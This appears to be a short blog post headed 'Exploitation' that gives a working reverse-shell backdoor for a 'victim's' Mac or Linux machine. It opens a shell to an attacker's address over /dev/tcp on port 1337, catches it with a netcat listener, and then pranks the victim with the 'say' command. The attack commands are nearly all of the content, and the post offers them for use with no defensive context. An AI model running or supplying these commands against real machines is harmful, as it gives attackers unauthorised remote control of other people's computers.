Title: A Lit Backdoor
Date: 2014-06-21 2:00
Category: Exploitation
Tags: Reverse_shell netcat

I was never a big fan of MacBooks. Being a penguin user for so long, you learn to stop worrying and love the bomb. But here is a little trick that works for both.

In the victim's machine (presumably a macbook), create the reverse shell in the port 1337:

```bash
$ sh -i >& /dev/tcp/ATTACKERS_IP/1337 0>&1
```

Now just netcat to it. From a Linux machine:

```bash
$ nc -l -p 1337
```

Or from a Macbook:
```bash
$ nc -l 1337
```

You should get shell. A cute prank is making the victim's computer talk:

```bash
$ say Hacked
```

:)
